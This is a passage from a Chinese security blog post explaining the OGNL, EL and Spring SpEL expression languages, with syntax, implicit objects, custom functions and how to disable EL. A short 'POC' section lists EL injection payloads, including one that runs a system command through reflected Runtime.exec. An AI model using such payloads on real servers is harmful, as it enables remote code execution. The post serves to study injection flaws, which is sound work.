+<p>简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。</p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>[OGNL表达式注入漏洞总结 <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"> Mi1k7ea ]</a></p>
+<h3 id="EL"><a href="#EL" class="headerlink" title="EL"></a>EL</h3><h4 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h4><h5 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h5><p>在<code>JSP</code>中访问模型对象是通过<code>EL</code>表达式的语法来表达. 所有<code>EL</code>表达式的格式都是以<code>$&#123;&#125;</code>表示. 例如, <code>$&#123;userinfo&#125;</code>代表获取变量<code>userinfo</code>的值. 当<code>EL</code>表达式中的变量不给定范围时, 则默认在<code>page</code>范围查找, 然后依次在<code>request</code>、<code>session</code>、<code>application</code>范围查找. 也可以用范围作为前缀表示属于哪个范围的变量, 例如: <code>$&#123;pageScope. userinfo&#125;</code>表示访问<code>page</code>范围中的<code>userinfo</code>变量.</p>
+<p><code>EL</code>表达式提供<code>.</code>和<code>[]</code>两种运算符来存取数据. 当要存取的属性名称中包含一些特殊字符, 如<code>.</code>或<code>-</code>等并非字母或数字的符号, 就一定要使用<code>[]</code>. 例如: <code>$&#123;user.My-Name&#125;</code>应当改为<code>$&#123;user[&quot;My-Name&quot;]&#125;</code>. 如果要动态取值时, 就可以用<code>[]</code>来做, 而<code>.</code>无法做到动态取值, 例如: <code>$&#123;sessionScope.user[data]&#125;</code>中<code>data</code>是一个变量.</p>
+<h5 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h5><p><code>JSP</code>表达式语言定义了一组隐式对象, 其中许多对象在<code>JSP Scriplet</code>和表达式中可用</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pageContext</td>
+<td><code>JSP</code>页的上下文, 可以用于访问<code>JSP</code>隐式对象, 如请求、响应、会话、输出、<code>servletContext</code>等. 例如, <code>$&#123;pageContext.response&#125;</code>为页面的响应对象赋值.</td>
+</tr>
+</tbody></table>
+<p>此外, 还提供几个隐式对象, 允许对以下对象进行简易访问:</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>param</td>
+<td>将请求参数名称映射到单个字符串参数值(通过调用<code>ServletRequest.getParameter(String name)</code>获得). <code>getParameter(String)</code>方法返回带有特定名称的参数. 表达式<code>$&#123;param.name&#125;</code>相当于<code>request.getParameter(name)</code>.</td>
+</tr>
+<tr>
+<td>paramValues</td>
+<td>将请求参数名称映射到一个数值数组(通过调用<code>ServletRequest.getParameter(String name)</code>获得). 它与<code>param</code>隐式对象非常类似, 但它检索一个字符串数组而不是单个值. 表达式<code>$&#123;paramvalues.name&#125;</code>相当于<code>request.getParamterValues(name)</code>.</td>
+</tr>
+<tr>
+<td>header</td>
+<td>将请求头名称映射到单个字符串头值(通过调用<code>ServletRequest.getHeader(String name)</code>获得). 表达式<code>$&#123;header.name&#125;</code>相当于<code>request.getHeader(name)</code>.</td>
+</tr>
+<tr>
+<td>headerValues</td>
+<td>将请求头名称映射到一个数值数组(通过调用<code>ServletRequest.getHeaders(String)</code>获得). 它与头隐式对象非常类似, 表达式<code>$&#123;headerValues.name&#125;</code>相当于<code>request.getHeaderValues(name)</code>.</td>
+</tr>
+<tr>
+<td>cookie</td>
+<td>将<code>cookie</code>名称映射到单个<code>cookie</code>对象. 向服务器发出的客户端请求可以获得一个或多个<code>cookie</code>. 表达式<code>$&#123;cookie.name.value&#125;</code>返回带有特定名称的第一个<code>cookie</code>值. 如果请求包含多个同名的<code>cookie</code>, 则应该使用<code>$&#123;headerValues.name&#125;</code>表达式.</td>
+</tr>
+<tr>
+<td>initParam</td>
+<td>将上下文初始化参数名称映射到单个值(通过调用<code>ServletContext.getInitparameter(String name)</code>获得).</td>
+</tr>
+</tbody></table>
+<p>除了上述两种类型的隐式对象之外, 还有些对象允许访问多种范围的变量, 如<code>Web 上下文</code>、<code>会话</code>、<code>请求</code>、<code>页面</code>:</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pageScope</td>
+<td>将页面范围的变量名称映射到其值. 例如, <code>EL</code>表达式可以使用<code>$&#123;pageScope.objectName&#125;</code>访问一个<code>JSP</code>中页面范围的对象, 还可以使用<code>$&#123;pageScope.objectName.attributeName&#125;</code>访问对象的属性.</td>
+</tr>
+<tr>
+<td>requestScope</td>
+<td>将请求范围的变量名称映射到其值, 该对象允许访问请求对象的属性. 例如, <code>EL</code>表达式可以使用<code>$&#123;requestScope.objectName&#125;</code>访问一个<code>JSP</code>请求范围的对象, 还可以使用<code>$&#123;requestScope.objectName.attributeName&#125;</code>访问对象的属性.</td>
+</tr>
+<tr>
+<td>sessionScope</td>
+<td>将会话范围的变量名称映射到其值, 该对象允许访问会话对象的属性. 例如, <code>$&#123;sessionScope.name&#125;</code>.</td>
+</tr>
+<tr>
+<td>applicationScope</td>
+<td>将应用程序范围的变量名称映射到其值, 该隐式对象允许访问应用程序范围的对象.</td>
+</tr>
+</tbody></table>
+<h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><p><code>EL</code>允许您在表达式中使用函数, 这些函数必须被定义在自定义标签库中. 要使用任何标签库中的函数, 需要将这些库安装在服务器中, 然后使用<code>&lt;taglib&gt;</code>标签在JSP文件中包含这些库. 函数的使用语法如下:</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">$&#123;ns:func(param1, param2, ...)&#125;
+
+ns: 命名空间
+func: 指的是函数的名称
+paramx: 参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="调用java方法"><a href="#调用java方法" class="headerlink" title="调用java方法"></a>调用java方法</h5><p>先新建一个<code>ELFunc</code>类, 其中定义的<code>doSomething</code>函数用于输出<code>Hello, xxx!</code>:</p>
+<pre class="line-numbers language-none"><code class="language-none">package h3rmek1t.javawebsecurity;
+
+&#x2F;**
+ * @Author: H3rmesk1t
+ * @Data: 2022&#x2F;3&#x2F;17 11:24 下午
+ *&#x2F;
+public class ELFunc &#123;
+
+    public static String doSomething(String str) &#123;
+
+        return &quot;Hello, &quot; + str + &quot;!&quot;;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着在<code>WEB-INF</code>文件夹下新建<code>test.tld</code>文件, 其中指定执行的<code>Java</code>方法及其<code>URI</code>地址:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;taglib version&#x3D;&quot;2.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&quot;
+        xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
+        xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&#x2F;web-jsptaglibrary_2_0.xsd&quot;&gt;
+    &lt;tlib-version&gt;1.0&lt;&#x2F;tlib-version&gt;
+    &lt;short-name&gt;ELFunc&lt;&#x2F;short-name&gt;
+    &lt;uri&gt;http:&#x2F;&#x2F;www.h3rmesk1t.com&#x2F;ELFunc&lt;&#x2F;uri&gt;
+    &lt;function&gt;
+        &lt;name&gt;doSomething&lt;&#x2F;name&gt;
+        &lt;function-class&gt;h3rmek1t.javawebsecurity.ELFunc&lt;&#x2F;function-class&gt;
+        &lt;function-signature&gt; java.lang.String doSomething(java.lang.String)&lt;&#x2F;function-signature&gt;
+    &lt;&#x2F;function&gt;
+&lt;&#x2F;taglib&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>JSP</code>文件中, 先头部导入<code>taglib</code>标签库, <code>URI</code>为<code>test.tld</code>中设置的<code>URI</code>地址, <code>prefix</code>为<code>test.tld</code>中设置的<code>short-name</code>, 然后直接在<code>EL</code>表达式中使用<code>类名:方法名()</code>的形式来调用该类方法即可:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%@taglib uri&#x3D;&quot;http:&#x2F;&#x2F;www.h3rmesk1t.com&#x2F;ELFunc&quot; prefix&#x3D;&quot;ELFunc&quot;%&gt;
+$&#123;ELFunc:doSomething(&quot;h3rmesk1t&quot;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h5 id="禁用EL表达式"><a href="#禁用EL表达式" class="headerlink" title="禁用EL表达式"></a>禁用EL表达式</h5><p>全局禁用 EL 表达式</p>
+<p>在<code>web.xml</code>中进行如下配置:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;jsp-config&gt;
+    &lt;jsp-property-group&gt;
+        &lt;url-pattern&gt;*.jsp&lt;&#x2F;url-pattern&gt;
+        &lt;el-ignored&gt;true&lt;&#x2F;el-ignored&gt;
+    &lt;&#x2F;jsp-property-group&gt;
+&lt;&#x2F;jsp-config&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>单个文件禁用 EL 表达式</p>
+<p>在<code>JSP</code>文件中可以有如下定义来表示是否禁用<code>EL</code>表达式, <code>true</code>表示禁止, <code>false</code>表示不禁止, 在<code>JSP2.0</code>中默认的启用<code>EL</code>表达式.</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%@ page isELIgnored&#x3D;&quot;true&quot; %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&#x2F;&#x2F; 对应于 JSP 页面中的 pageContext 对象.
+$&#123;pageContext&#125;
+
+&#x2F;&#x2F; 获取 Web 路径.
+$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;
+
+&#x2F;&#x2F; 文件头参数.
+$&#123;header&#125;
+
+&#x2F;&#x2F; 获取 webRoot.
+$&#123;applicationScope&#125;
+
+&#x2F;&#x2F; 执行命令.
+$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://github.com/H3rmesk1t/Learning_summary/blob/main/WebSec/JAVA/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5.md">Learning_summary/Java安全学习—EL表达式注入.md at main · H3rmesk1t/Learning_summary (github.com)</a></p>
+<h3 id="spel"><a href="#spel" class="headerlink" title="spel"></a>spel</h3><h4 id="基础-2"><a href="#基础-2" class="headerlink" title="基础"></a>基础</h4><ul>
+<li><code>.</code>的用法</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span><span class="token string">"'Hello World'.concat('!')"</span><span class="token punctuation">)</span>
+<span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span><span class="token string">"'Hello World'.bytes"</span><span class="token punctuation">)</span>
+<span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span><span class="token string">"'Hello World'.bytes.length"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>EvaluationContext 接口</li>
+</ul>
+<p>当计算表达式解析properties, methods, fields，并帮助执行类型转换, 使用接口<code>EvaluationContext</code> 这是一个开箱即用的实现, <code>StandardEvaluationContext</code>，使用反射来操纵对象， 缓存<code>java.lang.reflect</code>的<code>Method</code>，<code>Field</code>，和<code>Constructor</code>实例 提高性能。</p>
+<p>该<code>StandardEvaluationContext</code>是你可以指定root object通过使用 <code>setRootObject（）</code>或传递root object到构造函数. 你也可以指定变量和函数 使用方法’的setVariable（）<code>和</code>registerFunction（）`的表达式</p>
+<ul>
+<li>基于XML的配置</li>
+</ul>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>randomNumber<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123; T(java.lang.Math).random() * 100.0 &#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token comment">&lt;!--systemProperties是一个预定义的--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>defaultLocale<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123; systemProperties[<span class="token punctuation">'</span>user.region<span class="token punctuation">'</span>] &#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token comment">&lt;!--参考其他的bean属性的名字--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>initialShapeSeed<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123; numberGuess.randomNumber &#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>基于注解的配置</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//@ Value注解可以放在字段，方法和方法/​​构造 参数里，以指定默认值。</span>
+<span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"#&#123; systemProperties['user.region'] &#125;"</span><span class="token punctuation">)</span>
+<span class="token keyword">private</span> <span class="token class-name">String</span> defaultLocale<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>变量可以在使用语法<code>＃variableName</code>表达引用</p>
+<p>变量#this 始终定义和指向的是当前的执行对象 （不支持对其中不合格的引用解析）。变量#root总是 定义和指向root context object</p>
+<p><strong>函数的使用</strong></p>
+<p>您可以通过注册，可以在该调用用户自定义函数扩展SpEL 表达式字符串。该函数注册到’StandardEvaluationContext`使用 该方法。</p>
+<pre class="line-numbers language-none"><code class="language-none">public void registerFunction(String name, Method m)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>引用一个Java方法提供了函数的实现。举个例子 一个实用的方法来扭转字符串如下所示。</p>
+<pre class="line-numbers language-none"><code class="language-none">public abstract class StringUtils &#123;
+
+    public static String reverseString(String input) &#123;
+        StringBuilder backwards &#x3D; new StringBuilder();
+        for (int i &#x3D; 0; i &lt; input.length(); i++)
+            backwards.append(input.charAt(input.length() - 1 - i));
+        &#125;
+        return backwards.toString();
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个方法在解析器上线文当中被注册，作为字符串被调用。</p>
+<pre class="line-numbers language-none"><code class="language-none">ExpressionParser parser &#x3D; new SpelExpressionParser();
+StandardEvaluationContext context &#x3D; new StandardEvaluationContext();
+
+context.registerFunction(&quot;reverseString&quot;,
+    StringUtils.class.getDeclaredMethod(&quot;reverseString&quot;, new Class[] &#123; String.class &#125;));
+
+String helloWorldReversed &#x3D; parser.parseExpression(
+    &quot;#reverseString(&#39;hello&#39;)&quot;).getValue(context, String.class);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果解析上下文已经配置，那么bean解析器能够 从表达式使用（@）符号查找bean类。</p>
+<pre class="line-numbers language-none"><code class="language-none">ExpressionParser parser &#x3D; new SpelExpressionParser();
+StandardEvaluationContext context &#x3D; new StandardEvaluationContext();
+context.setBeanResolver(new MyBeanResolver());
+
+&#x2F;&#x2F; This will end up calling resolve(context,&quot;foo&quot;) on MyBeanResolver during evaluation
+Object bean &#x3D; parser.parseExpression(&quot;@foo&quot;).getValue(context);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><a target="_blank" rel="noopener" href="http://itmyhome.com/spring/expressions.html">8. Spring 表达式语言 (SpEL) (itmyhome.com)</a></p>
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>RoboTerh</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="OGNL_EL_Spel表达式">https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul><script>document.addEventListener('copy', function (event) {
+  const clipboardData = event.clipboardData || window.clipboardData;
+  if (!clipboardData) { return; }
+  const text = window.getSelection().toString();
+  if (text) {
+    event.preventDefault();
+    clipboardData.setData('text/plain', text + '\n\nPost author: RoboTerh\nPost link: https://roboterh.github.io/2022/04/07/OGNL_EL_Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F/\nCopyright Notice: All articles in this blog are licensed under CC BY-NC-SA 4.0 unless otherwise stated.');
+  }
+});</script></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2022/04/09/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-filejava/" rel="prev" title="网鼎杯2020 filejava"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">网鼎杯2020 filejava</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/04/07/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" rel="next" title="OGNL表达式注入"><span class="post-nav-text">OGNL表达式注入</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> RoboTerh</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
